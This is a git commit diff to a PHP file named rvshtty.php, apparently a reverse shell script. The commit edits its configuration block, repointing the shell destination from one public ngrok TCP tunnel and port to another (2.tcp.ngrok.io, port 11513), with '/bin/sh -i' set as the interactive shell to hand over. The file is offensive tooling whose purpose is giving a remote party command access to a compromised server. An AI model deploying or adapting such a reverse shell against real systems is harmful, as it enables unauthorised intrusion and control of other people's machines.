2d539f76b67ca17daddd1179da0faf43e08a89de
trhacknon <98242014+trhacknon@users.noreply.github.com>
2022-03-28 14:10:07 +0200

    Update rvshtty.php

--- rvshtty.php
+++ rvshtty.php
@@ -4,8 +4,8 @@
 
     // CHANGE THE FOLLOWING PARAMS AS NEEDED:
     //---------------------------------------------------------------
-    $addr = '4.tcp.ngrok.io';   # shell destination (loopback for testing)
-    $port = 12612;          # shell destination port
+    $addr = '2.tcp.ngrok.io';   # shell destination (loopback for testing)
+    $port = 11513;          # shell destination port
     $timeout = 20.0;       # connection timeout time (seconds):
     $shell = '/bin/sh -i'; # shell to run
     //---------------------------------------------------------------
